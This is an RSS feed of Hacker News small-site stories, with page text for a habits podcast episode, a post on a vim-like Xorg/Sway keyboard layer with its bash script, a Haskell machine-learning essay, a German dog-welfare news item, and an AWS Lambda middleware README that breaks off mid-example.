<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Thu, 27 Aug 2020 20:21:47 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Thu, 27 Aug 2020 20:21:47 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Atomic Habits: How to Create Good Habits and Break Bad Ones [audio]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24280805">thread link</a>) | @nonoesp
<br/>
August 26, 2020 | https://gettingsimple.com/atomic-habits | <a href="https://web.archive.org/web/*/https://gettingsimple.com/atomic-habits">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <article>
      
            <div>

                <p>August 26, 2020</p>

                

                

<p>How to create good habits and break bad ones.</p>

<p>This episode is part of the Habits series. In this excerpt from my interview with Scott Mitchell (episode 29), Scott and I discuss what atomic habits are, how to use them to create good habits and break bad ones, how I started implementing them in my daily routine more than a year ago, the difference between flow and deliberate practice, and why you should schedule your leisure time.</p>

<br>
<h2>Links</h2>

<ul>
<li>
<a target="_blank" href="https://docs.google.com/spreadsheets/d/1x2XBeOXjS6tWmF9i_XKaaODwi8Ba69lid2k3YKeLZpo/edit?usp=sharing">Habit tracker sheets template</a>
</li>
<li>
<a target="_blank" href="https://en.wikipedia.org/wiki/Flow_(psychology)">Flow</a>
</li>
<li>
<a target="_blank" href="https://en.wikipedia.org/wiki/Practice_(learning_method)#Deliberate_practice">Deliberate practice</a>
</li>
<li>
<a target="_blank" href="https://jamesclear.com/three-steps-habit-change">How To Start New Habits That Actually Stick</a> by James Clear</li>
<li>
<a target="_blank" href="https://sketch.nono.ma/">Nono's sketches</a>
</li>
</ul>
<h2>Books</h2>

<ul>
<li>
<a target="_blank" href="https://jamesclear.com/atomic-habits">Atomic Habits</a> by James Clear</li>
<li>
<a target="_blank" href="https://www.calnewport.com/books/digital-minimalism/">Digital Minimalism</a> by Cal Newport</li>
<li>
<a href="https://gettingsimple.com/scott-young-ultralearning">Ultralearning</a> by Scott Young</li>
</ul>
<h2>People mentioned</h2>

<ul>
<li>
<a target="_blank" href="https://gettingsimple.com/scott-mitchell">Scott Mitchell</a>
</li>
<li>
<a target="_blank" href="https://jamesclear.com/">James Clear</a>
</li>
<li>
<a target="_blank" href="https://www.scotthyoung.com/">Scott Young</a>
</li>
<li>
<a target="_blank" href="http://calnewport.com/">Cal Newport</a>
</li>
<li>
<a target="_blank" href="https://en.wikipedia.org/wiki/Mihaly_Csikszentmihalyi">Mihaly Csikszentmihalyi</a>
</li>
<li>
<a target="_blank" href="https://en.wikipedia.org/wiki/K._Anders_Ericsson">Anders Ericsson</a>
</li>
</ul>
<h2>Topics</h2>

<ul>
<li>Intro. [0:00]</li>
<li>Atomic habits. [0:43]</li>
<li>How to create good habits (and break bad ones). [2:59]</li>
<li>Don't break the chain. [3:57]</li>
<li>Meditation. [5:41]</li>
<li>Writing. [6:08]</li>
<li>Sketching. [6:32]</li>
<li>Why? [6:53]</li>
<li>Discipline, flow, and deliberate practice. [8:15]</li>
<li>Scheduling your leisure time. [9:47]</li>
<li>Things are not obvious. [11:15]</li>
<li>Outro. [11:57]</li>
</ul>
<p>If you enjoy the podcast, would you please consider <a target="_blank" href="https://itunes.apple.com/us/podcast/getting-simple/id1319158020">leaving a short review</a> on Apple Podcasts/iTunes? It takes less than 60 seconds and really helps.</p>

<p>Theme and exit songs, <em>Sleep</em> and <em>A Loop to Kill For</em>, by Steve Combs under CC BY 4.0.</p>
        
            </div>
        
            </article>
    </div></div>]]>
            </description>
            <link>https://gettingsimple.com/atomic-habits</link>
            <guid isPermaLink="false">hacker-news-small-sites-24280805</guid>
            <pubDate>Wed, 26 Aug 2020 09:40:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vim-Like Layer for Xorg and Wayland]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24280413">thread link</a>) | @ceda_ei
<br/>
August 26, 2020 | https://cedaei.com/posts/vim-like-layer-for-xorg-wayland/ | <a href="https://web.archive.org/web/*/https://cedaei.com/posts/vim-like-layer-for-xorg-wayland/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
        
<h2 id="insert-mode">Insert Mode<a href="#insert-mode" arialabel="Anchor">⌗</a> </h2>
<p><img src="https://cedaei.com/images/insert_mode.jpg" alt="Insert Mode: A keyboard layout similar to normal QWERTYlayout"></p>
<h2 id="normal-mode">Normal Mode<a href="#normal-mode" arialabel="Anchor">⌗</a> </h2>
<p><img src="https://cedaei.com/images/normal_mode.jpg" alt="Normal Mode: A keyboard layout with the alphabet keys replaced with shortcutkey"></p>
<p>Inspired by vim, I wanted to create a layer on top of my keyboard which worked
like a shortcut layer. So, to start off, I found out about XKB<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. XKB is the
Xorg Keyboard Extension which tells Xorg on how to react to input from
keyboard.  After reading through some source code, I found out that Xorg has
support for function keys F1 - F35<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. The general idea here was:</p>
<ul>
<li>Create an insert mode layout for text input.</li>
<li>Replace keys with relevant keys in normal mode (e.g. replace j with Down) and
for keys that require executing a command, replace then with a function key
above F12 (e.g. replace q with F13).</li>
<li>Bind all the function keys above F12 to the respective functions.</li>
</ul>
<p>To start off, I began a fresh Xorg session with nothing modifying the keys
(removed <code>xmodmap</code> from startup) and first dumped the current layout into a
file.</p>
<div><pre><code data-lang="bash">xkbcomp $DISPLAY ~/.xkb/insert.xkb
</code></pre></div><p>This was my starting point. I made changes to this file which were common to
both Insert and Normal mode. e.g. replaced <code>Caps Lock</code> with <code>Ctrl</code> and made
<code>Shift+Caps Lock</code> <code>Caps Lock</code>. Also, I unbound <code>Alt_R</code> as a modifier so that I
could use that as a switch between Normal and Insert Mode.</p>
<p>Here is a diff between the original layout and Insert mode.</p>
<pre><code>1323c1321
&lt;     key &lt;CAPS&gt; {         [       Caps_Lock ] };
---
&gt;     key &lt;CAPS&gt; {         [       Control_L,       Caps_Lock ] };
1551c1549
&lt;     modifier_map Lock { &lt;CAPS&gt; };
---
&gt;     modifier_map Control { &lt;CAPS&gt; };
1555d1552
&lt;     modifier_map Mod1 { &lt;RALT&gt; };
</code></pre><p>Next, I copied <code>~/.xkb/insert.xkb</code> to <code>~/.xkb/normal.xkb</code>. I replaced keys as
per the plan.</p>
<p>Here is a diff between Insert mode and Normal mode.</p>
<div><pre><code data-lang="diff">1200c1200
&lt;         symbols[Group1]= [               q,               Q ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F13]
1204c1204
&lt;         symbols[Group1]= [               w,               W ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F14]
1208c1208
&lt;         symbols[Group1]= [               e,               E ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F15]
1212c1212
&lt;         symbols[Group1]= [               r,               R ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F16]
1216c1216
&lt;         symbols[Group1]= [               t,               T ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F17]
1220c1220
&lt;         symbols[Group1]= [               y,               Y ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F18]
1224c1224
&lt;         symbols[Group1]= [               u,               U ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F19]
1228c1228
&lt;         symbols[Group1]= [               i,               I ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Alt_R]
1232c1232
&lt;         symbols[Group1]= [               o,               O ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F20]
1236c1236
&lt;         symbols[Group1]= [               p,               P ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F21]
1244c1244
&lt;         symbols[Group1]= [               a,               A ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F22]
1248c1248
&lt;         symbols[Group1]= [               s,               S ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Delete]
1252c1252
&lt;         symbols[Group1]= [               d,               D ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [BackSpace]
1256c1256
&lt;         symbols[Group1]= [               f,               F ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Home]
1260c1260
&lt;         symbols[Group1]= [               g,               G ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [End]
1264c1264
&lt;         symbols[Group1]= [               h,               H ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Left]
1268c1268
&lt;         symbols[Group1]= [               j,               J ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Down]
1272c1272
&lt;         symbols[Group1]= [               k,               K ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Up]
1276c1276
&lt;         symbols[Group1]= [               l,               L ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Right]
1285c1285
&lt;         symbols[Group1]= [               z,               Z ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F23]
1289c1289
&lt;         symbols[Group1]= [               x,               X ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F24]
1293c1293
&lt;         symbols[Group1]= [               c,               C ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F25]
1297c1297
&lt;         symbols[Group1]= [               v,               V ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F26]
1301c1301
&lt;         symbols[Group1]= [               b,               B ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [F27]
1305c1305
&lt;         symbols[Group1]= [               n,               N ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Next]
1309c1309
&lt;         symbols[Group1]= [               m,               M ]
<span>---
</span><span></span>&gt;         symbols[Group1]= [Prior]
</code></pre></div><p>At this point, <code>normal.xkb</code> file defines the following layout.</p>
<p><img src="https://cedaei.com/images/normal_mode_unbound.jpg" alt="Normal Mode: A keyboard "></p>
<p>Now, we need a script that switches between layouts. To load an layout in Xorg, we use</p>
<div><pre><code data-lang="bash">xkbcomp ~/.xkb/normal.xkb <span>"</span>$DISPLAY<span>"</span>
</code></pre></div><p>Sway supports this via the input command in the following form.</p>
<div><pre><code data-lang="bash">swaymsg input <span>'*'</span> xkb_file ~/.xkb/normal.xkb
</code></pre></div><p>The following script cycles through the layouts when it is called. It also
allows to add more layouts later (just add them to layouts array and it will
cycle in the order of the array).</p>
<div><pre><code data-lang="bash"><span>#!/usr/bin/env bash
</span><span></span><span># Usage: xkb_swapper.sh [layout_name]</span>

<span>function</span> set_layout<span>()</span> <span>{</span>
	echo <span>"Setting layout to </span>$1<span>"</span>
	<span>if</span> <span>[[</span> -v WAYLAND_DISPLAY <span>]]</span>; <span>then</span>
		swaymsg input <span>'*'</span> xkb_file ~/.xkb/<span>"</span>$1<span>"</span>.xkb
	<span>else</span>
		xkbcomp ~/.xkb/<span>"</span>$1<span>"</span>.xkb <span>"</span>$DISPLAY<span>"</span>
	<span>fi</span>
	echo <span>"</span>$1<span>"</span> &gt; ~/.cache/xkb-curr-<span>"</span>$DISPLAY<span>"</span>
<span>}</span>
layouts<span>=(</span>insert normal<span>)</span>
current_layout<span>=</span><span>$(</span>cat ~/.cache/xkb-curr-<span>"</span>$DISPLAY<span>"</span> <span>||</span> echo <span>""</span><span>)</span>

<span>if</span> <span>[[</span> $1 !<span>=</span> <span>""</span> <span>]]</span>; <span>then</span>
	set_layout <span>"</span>$1<span>"</span>
	exit
<span>fi</span>
<span>if</span> <span>[[</span> $current_layout <span>==</span> <span>""</span> <span>]]</span>; <span>then</span>
	echo <span>"No current layout found!"</span>
	set_layout <span>"</span><span>${</span>layouts[0]<span>}</span><span>"</span>
<span>fi</span>

i<span>=</span><span>0</span>
<span>while</span> <span>[[</span> $i -lt <span>${#</span>layouts[@]<span>}</span> <span>]]</span>; <span>do</span>
	<span>if</span> <span>[[</span> $current_layout <span>==</span> <span>"</span><span>${</span>layouts[$i]<span>}</span><span>"</span> <span>]]</span>; <span>then</span>
		new_idx<span>=</span><span>"</span><span>$((</span>i+1<span>))</span><span>"</span>
		<span>if</span> <span>[[</span> $new_idx -eq <span>${#</span>layouts[@]<span>}</span> <span>]]</span>; <span>then</span>
			set_layout <span>"</span><span>${</span>layouts[0]<span>}</span><span>"</span>
		<span>else</span>
			set_layout <span>"</span><span>${</span>layouts[$new_idx]<span>}</span><span>"</span>
		<span>fi</span>
		exit
	<span>fi</span>
	<span>((</span>i++<span>))</span>
<span>done</span>

echo <span>"Current Layout doesn't exist!"</span>
set_layout <span>"</span><span>${</span>layouts[0]<span>}</span><span>"</span>
</code></pre></div><p>The above script works with all Xorg based DE/WMs as well as Sway (wayland
compositor). I saved it as <code>xkb_swapper.sh</code> in my <code>PATH</code>. Calling the script
without any argument cycles through the layouts. If arguments are passed, the
first argument is taken as layout name and layout is changed to that.</p>
<p>The last step is binding the function keys and <code>Alt_R</code> to commands to execute.
Here are some of the parts of my i3 config that bind the function keys.</p>
<pre><code>bindsym Alt_R exec xkb_swapper.sh
bindsym 0xffca kill
bindsym 0xffcf exec volchange -5
bindsym 0xffd0 exec volchange +5
bindsym 0xffd1 exec brightness -200
bindsym 0xffd2 exec brightness +200
bindsym 0xffcb exec mpc prev
bindsym 0xffcc exec mpc toggle
bindsym 0xffcd exec mpc next
</code></pre><p><code>i3</code> doesn’t seem to accept <code>F13</code> - <code>F35</code> as keynames however it accepts the
keycodes<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.  Here is a small list for easy access.</p>
<pre><code>0xffbe   F1
0xffbf   F2
0xffc0   F3
0xffc1   F4
0xffc2   F5
0xffc3   F6
0xffc4   F7
0xffc5   F8
0xffc6   F9
0xffc7   F10
0xffc8   F11
0xffc9   F12
0xffca   F13
0xffcb   F14
0xffcc   F15
0xffcd   F16
0xffce   F17
0xffcf   F18
0xffd0   F19
0xffd1   F20
0xffd2   F21
0xffd3   F22
0xffd4   F23
0xffd5   F24
0xffd6   F25
0xffd7   F26
0xffd8   F27
0xffd9   F28
0xffda   F29
0xffdb   F30
0xffdc   F31
0xffdd   F32
0xffde   F33
0xffdf   F34
0xffe0   F35
</code></pre>
<p>The script stores the mode in <code>~/.cache/xkb-curr-$DISPLAY</code>. <code>cat</code> that and
wrap in your bar’s config. Here is my config for
<a href="https://github.com/greshake/i3status-rust">i3status-rust</a>.</p>
<div><pre><code data-lang="toml">[[<span>block</span>]]
<span>block</span> = <span>"custom"</span>
<span>command</span> = <span>"echo -en '\\uf11c '; cat ~/.cache/xkb-curr-$DISPLAY"</span>
<span>interval</span> = <span>0.5</span>
</code></pre></div><section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>As always, the <a href="https://wiki.archlinux.org/index.php/X_keyboard_extension">Arch Wiki page on XKB</a> is a nice place to start. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>You can find all the defined keys in <code>/usr/include/X11/keysymdef.h</code>. <a href="#fnref:2" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>

      </div></div></div>]]>
            </description>
            <link>https://cedaei.com/posts/vim-like-layer-for-xorg-wayland/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24280413</guid>
            <pubDate>Wed, 26 Aug 2020 08:34:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Machine Learning in Haskell]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24280339">thread link</a>) | @bulla
<br/>
August 26, 2020 | https://tonyday567.github.io/posts/learning/ | <a href="https://web.archive.org/web/*/https://tonyday567.github.io/posts/learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
  <section>
    <article>
      <header>
        
        <div>
          <p><span>
              <i></i>
              <time datetime="2020-07-28T00:00:00+10:00">
                July 28, 2020
              </time>
            </span>
            <span>
              <i></i>
              4-minute read
            </span>
          </p>
          
          

        </div>
      </header>

      <div>
        
        <p>Much advocacy of Haskell, in general, boils down to type-safety and elimination of bugs. How boring. My personal experience is that bugs are trickier in Haskell and I can write bad code in an extraordinary variety of ways.</p>
<p>I don’t code in Haskell to help eliminate bugs. That seems a goal unlikely to produce joy in my code. I write Haskell primarily because in enables me to name things a bit better.</p>
<h2 id="what-is-learning">What is Learning?</h2>
<p>As an example, I came across this quote within the first few pages of a popular online course on machine learning:</p>
<blockquote>
<p>A computer program is said to learn from experience E with respect to some task T and some performance measure P, if its performance on T, as measured by P, improves with experience E. ~ Tom Mitchell</p>
</blockquote>
<p>Here’s how I unpacked this into types:</p>
<div><pre><code data-lang="haskell"><span>-- | learning is to use experience to change the performance of a task.</span>
<span>newtype</span> <span>Learn</span> f e p <span>=</span>
  <span>Learn</span> { change <span>::</span> (<span>Foldable</span> f) <span>=&gt;</span> <span>Experience</span> f e <span>-&gt;</span> <span>Task</span> e p <span>-&gt;</span> <span>Task</span> e p }

</code></pre></div><p>A common approach to newtypes is to label the unwrapping as a reversal of the newtype (such as <code>unlearn</code> or <code>unLearn</code>) but this misses an important naming opportunity: to use a Learn is to change.</p>
<div><pre><code data-lang="haskell"><span>-- | An experience is set of e's</span>
<span>newtype</span> <span>Experience</span> f e <span>=</span> <span>Experience</span> { set <span>::</span> f e }
</code></pre></div><div><pre><code data-lang="haskell"><span>-- | A task takes an e and measures performance.</span>
<span>newtype</span> <span>Task</span> e p <span>=</span> <span>Task</span> { measure <span>::</span> e <span>-&gt;</span> p } <span>deriving</span> (<span>Profunctor</span>)
</code></pre></div><p>This could be thought of (and coded) as an ordinary function with type (e -&gt; p). The advantage of using a newtype, however, is to highlight the two ways that a task can change:</p>
<ul>
<li>changing the way a task is performed (the <code>e</code>).</li>
<li>changing the way a task is measured (the <code>p</code>).</li>
</ul>
<p>Acting on a learning, you can change the way a task is performed, such as changing parameters of a function, or change the way you view what performance is.</p>
<p>To change the way a task is performed, taking experience into account, is to make progress. Progress is made one step at a time.</p>
<div><pre><code data-lang="haskell"><span>-- | To progress, is to transduce a Task, via a carrier</span>
<span>newtype</span> <span>Progress</span> e p <span>=</span> <span>Progress</span> { step <span>::</span> e <span>-&gt;</span> <span>Task</span> e p <span>-&gt;</span> <span>Task</span> e p}
</code></pre></div><p>Putting these above types together in a useful way, to learn, is then to repeatedly apply a progressive step to a set of experiences.</p>
<div><pre><code data-lang="haskell"><span>-- | to learn, is to make Progress from an Experience.</span>
<span>learn</span> <span>::</span> <span>Progress</span> e p <span>-&gt;</span> <span>Learn</span> f e p
<span>learn</span> p <span>=</span> <span>Learn</span> $ <span>\</span>(<span>Experience</span> e) task <span>-&gt;</span> foldr (step p) task e
</code></pre></div><p>To <code>machine learn</code>, we change the way a <code>machine</code> does a task, based on learning, measuring whether performance improves, and adopt the new way to do a task if it does.</p>
<div><pre><code data-lang="haskell"><span>-- | to improve, given a way to change a task by experience, </span>
<span>--</span>
<span>-- you need to choose the better performace way over an experience set.</span>
<span>improve</span> <span>::</span>
  (<span>Ord</span> (f p), <span>Foldable</span> f, <span>Functor</span> f) <span>=&gt;</span>
  <span>Progress</span> e p <span>-&gt;</span>
  <span>Experience</span> f e <span>-&gt;</span>
  <span>Task</span> e p <span>-&gt;</span>
  <span>Task</span> e p
<span>improve</span> progress es task <span>=</span>
  bool task task' (p' &gt; p)
  <span>where</span>
    task' <span>=</span> change (learn progress) es task
    p <span>=</span> measure task &lt;$&gt; set es
    p' <span>=</span> measure task' &lt;$&gt; set es
</code></pre></div><p>The constraints contained in the above code are mostly based on suggestions from ghc to get a compile, and I didn’t think about them much in drafting. Type constraints provide useful guide-rails for future development of these ideas.</p>
<h2 id="machine-learning-in-haskell">Machine Learning in Haskell?</h2>
<p>In the above example of improving we are left with an <code>Ord (f p)</code> constraint - that the performance over an experience set is ordinal. If we narrow the constraint to a <code>Num (f p)</code>, in other words, assume that the size of the <code>f p</code> is meaningful, then we have wandered in to the traditional numerical methods domain, and can, for example, start to think about gradients to speed up our improvement.</p>
<p>By insisting on useful and concrete names (aka types), Haskell supplies a constrained domain we can further explore.  For example, are there machine learning examples that don’t fit the candidate types and constraints?</p>
<p>Naming things is hard, and other ways of coding tend to avoid the task. Types bring me joy and I shall keep them, thank you very much, and continue to curate collections of them, for fun and profit. In this example, I now have as good a definition of machine learning as you’ll find out in the wild, and my progress on machine learning will be more comprehensive, faster and safer than bashing away in python.</p>
<p>And yet, to a first degree, machine learning in Haskell does not exist, swamped by the easiness of dynamic types. If the promises being made by ML are to be eventually honoured, however, it may need less code bashing and better naming.</p>

      </div>

      
    </article>

    
  
  
  
  </section>

      </div></div>]]>
            </description>
            <link>https://tonyday567.github.io/posts/learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24280339</guid>
            <pubDate>Wed, 26 Aug 2020 08:21:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[German government plans stricter controls for dog owners and breeders]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24280333">thread link</a>) | @jiehong
<br/>
August 26, 2020 | https://www.iamexpat.de/expat-info/german-expat-news/german-government-plans-stricter-controls-dog-owners-and-breeders | <a href="https://web.archive.org/web/*/https://www.iamexpat.de/expat-info/german-expat-news/german-government-plans-stricter-controls-dog-owners-and-breeders">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <!--?xml version="1.0" encoding="UTF-8"?--><p>In future, a dog’s right to exercise could be enshrined in German law. That’s if a new draft ordinance issued by the Federal Ministry of Agriculture is passed. The law also seeks to improve conditions during the transportation of farm animals.</p><h2>New rules for dog owners, breeders and farm animals in Germany</h2><p>According to the draft regulation, which was seen by the German newspaper Rheinische Post, in future dog owners will have to ensure that their animals are walked at least twice a day, for a total of one hour. They will no longer be permitted to leave their dogs home alone all day or keep them chained up outside; a carer will need to check in on the animal “several times a day”.</p><p>Further rules will also apply specifically to dog breeders. The draft law stipulates that breeders be allowed to look after no more than three bitches with puppies at the same time. There will also be new regulations regarding the size and temperature of whelping boxes.&nbsp;</p><p>Shows with dogs that have been overbred to such an extent that they are in pain or no longer able to “behave appropriately” will be banned, as will those featuring animals whose body parts (such as ears or tail) have been “completely or partially amputated” in a manner contrary to animal welfare.&nbsp;</p><p>For farm animals, the new law stipulates that livestock transports within Germany may not exceed four and a half hours if the animals are directly exposed to temperatures of more than 30 degrees.</p><h2>Animals need movement and environmental stimuli</h2><p>The draft law cites “new scientific knowledge about the needs of dogs” as a justification for the stricter rules. Accordingly, animals should be given “a sufficient degree of movement and contact with environmental stimuli.” Federal Agriculture Minister Julia Klöckner said, “<a href="https://www.iamexpat.de/lifestyle/pets-information-germany">Pets</a> are not cuddly toys.”</p><p>When asked how the new laws will be enforced, especially for private dog owners, a spokesperson for the Agriculture Ministry said that the federal states would be responsible - but that they certainly wouldn’t be ringing the doorbell of every dog owner to check up on them. The law is primarily targeting those who keep their dogs outside in kennels. The draft now needs to be coordinated with the 16 federal states and professional associations.&nbsp;</p>
    </div><div>

        
        <div>
            
            <p>
                By clicking subscribe, you agree that we may process your information in accordance with our privacy policy. For more information, please
                <a href="https://www.iamexpat.de/legal/privacy/">visit this page</a>.
            </p>
        </div>
    </div></div>]]>
            </description>
            <link>https://www.iamexpat.de/expat-info/german-expat-news/german-government-plans-stricter-controls-dog-owners-and-breeders</link>
            <guid isPermaLink="false">hacker-news-small-sites-24280333</guid>
            <pubDate>Wed, 26 Aug 2020 08:20:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: AWS Lambda TypeScript Middleware]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24280237">thread link</a>) | @dbartholomae
<br/>
August 26, 2020 | https://dbartholomae.github.io/lambda-middleware/ | <a href="https://web.archive.org/web/*/https://dbartholomae.github.io/lambda-middleware/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content_wrap">
      <section id="main_content">
        <p><img src="https://dbartholomae.github.io/lambda-middleware/assets/lambda-middleware-logo.png" alt="@lambda-middleware"></p>

<p><a href="https://github.com/dbartholomae/lambda-middleware/issues"><img src="https://img.shields.io/github/issues-raw/dbartholomae/lambda-middleware.svg" alt="open issues"></a>
<a href="https://github.com/visionmedia/debug#readme"><img src="https://img.shields.io/badge/debug-blue.svg" alt="debug"></a>
<a href="https://github.com/dbartholomae/lambda-middleware/actions?query=workflow%3A.github%2Fworkflows%2Fbuild.yml"><img src="https://github.com/dbartholomae/lambda-middleware/workflows/.github/workflows/build.yml/badge.svg?branch=main" alt="build status"></a>
<a href="https://codecov.io/gh/dbartholomae/lambda-middleware"><img src="https://codecov.io/gh/dbartholomae/lambda-middleware/branch/main/graph/badge.svg" alt="codecov"></a></p>

<p>This monorepo is a collection of middleware for AWS lambda functions.</p>

<h2 id="middlewares">Middlewares</h2>

<ul>
  <li><a href="https://dbartholomae.github.io/lambda-middleware/packages/class-validator">@lambda-middleware/class-validator</a>: A validation middleware for AWS http lambda functions
based on class-validator.</li>
  <li><a href="https://dbartholomae.github.io/lambda-middleware/packages/compose">@lambda-middleware/compose</a>: A compose function for functional lambda middleware.</li>
  <li><a href="https://dbartholomae.github.io/lambda-middleware/packages/http-error-handler">@lambda-middleware/http-error-handler</a>: An error handler middleware for AWS http lambda
functions.</li>
  <li><a href="https://dbartholomae.github.io/lambda-middleware/packages/ie-no-open">@lambda-middleware/ie-no-open</a>: A middleware for adding the download options no-open header to
AWS lambdas.</li>
  <li><a href="https://dbartholomae.github.io/lambda-middleware/packages/json-serializer">@lambda-middleware/json-serializer</a>: A middleware for AWS http lambda functions to
serialize JSON responses.</li>
  <li><a href="https://dbartholomae.github.io/lambda-middleware/packages/jwt-auth">@lambda-middleware/jwt-auth</a>: A middleware for AWS http lambda functions to verify JWT auth
tokens inspired by express-jwt.</li>
  <li><a href="https://dbartholomae.github.io/lambda-middleware/packages/middy-adaptor">@lambda-middleware/middy-adaptor</a>: An adaptor to use middy middleware as functional
middleware.</li>
  <li><a href="https://dbartholomae.github.io/lambda-middleware/packages/no-sniff">@lambda-middleware/no-sniff</a>: A middleware for adding the content type options no-sniff header
to AWS lambdas.</li>
  <li><a href="https://dbartholomae.github.io/lambda-middleware/packages/http-header-normalizer">@lambda-middleware/http-header-normalizer</a>: Middleware for AWS lambdas that
normalizes headers to lower-case.</li>
  <li><a href="https://dbartholomae.github.io/lambda-middleware/packages/do-not-wait">@lambda-middleware/do-not-wait</a>: AWS lambda middleware to prevent Lambda from timing out
because of processes running after returning a value.</li>
  <li><a href="https://dbartholomae.github.io/lambda-middleware/packages/cors">@lambda-middleware/cors</a>: AWS lambda middleware for automatically adding CORS headers.</li>
</ul>

<h2 id="other-packages">Other packages</h2>

<p>Furthermore there is utility collection available at <a href="https://dbartholomae.github.io/packages/utils">@lambda-middleware/utils</a>.</p>

<h2 id="usage">Usage</h2>

<p>Each middleware is a higher-order function that can be wrapped around the handler function.</p>

<div><div><pre><code><span>export</span> <span>const</span> <span>handler</span> <span>=</span> <span>someMiddleware</span><span>()(()</span> <span>=&gt;</span> <span>{</span>
  <span>return</span> <span>{</span>
    <span>body</span><span>:</span> <span>''</span><span>,</span>
    <span>statusCode</span><span>:</span> <span>200</span>
  <span>}</span>
<span>})</span>
</code></pre></div></div>

<p>Each middleware is build as</p>
<div><div><pre><code><span>(</span><span>options</span><span>)</span> <span>=&gt;</span> <span>(</span><span>handler</span><span>)</span> <span>=&gt;</span> <span>(</span><span>event</span><span>,</span> <span>context</span><span>)</span> <span>=&gt;</span> <span>Response</span>
</code></pre></div></div>

<p>This means that middleware can be composed and piped like any other function with only one parameter (the handler).
This library contains <a href="https://dbartholomae.github.io/lambda-middleware/packages/compose">a helper for composing</a>, but <a href="https://lodash.com/docs/4.17.15#flowRight">any</a>
<a href="https://ramdajs.com/docs/#compose">other</a> <a href="https://github.com/tc39/proposal-pipeline-operator">implementation</a> should
work as well.</p>

<div><div><pre><code><span>export</span> <span>const</span> <span>handler</span> <span>=</span> <span>compose</span><span>(</span>
  <span>someMiddleware</span><span>(),</span>
  <span>someOtherMiddleware</span><span>(),</span>
  <span>aThirdMiddleware</span><span>()</span>
<span>)(()</span> <span>=&gt;</span> <span>{</span>
  <span>return</span> <span>{</span>
    <span>body</span><span>:</span> <span>''</span><span>,</span>
    <span>statusCode</span><span>:</span> <span>200</span>
  <span>}</span>
<span>})</span>
</code></pre></div></div>

<p>Composing middleware is equivalent to calling it nested:</p>
<div><div><pre><code><span>export</span> <span>const</span> <span>handler</span> <span>=</span>
  <span>someMiddleware</span><span>()(</span>
    <span>someOtherMiddleware</span><span>()(</span>
      <span>aThirdMiddleware</span><span>()(()</span> <span>=&gt;</span> <span>{</span>
        <span>return</span> <span>{</span>
          <span>body</span><span>:</span> <span>''</span><span>,</span>
          <span>statusCode</span><span>:</span> <span>200</span>
        <span>}</span>
      <span>})</span>
    <span>)</span>
  <span>)</span>
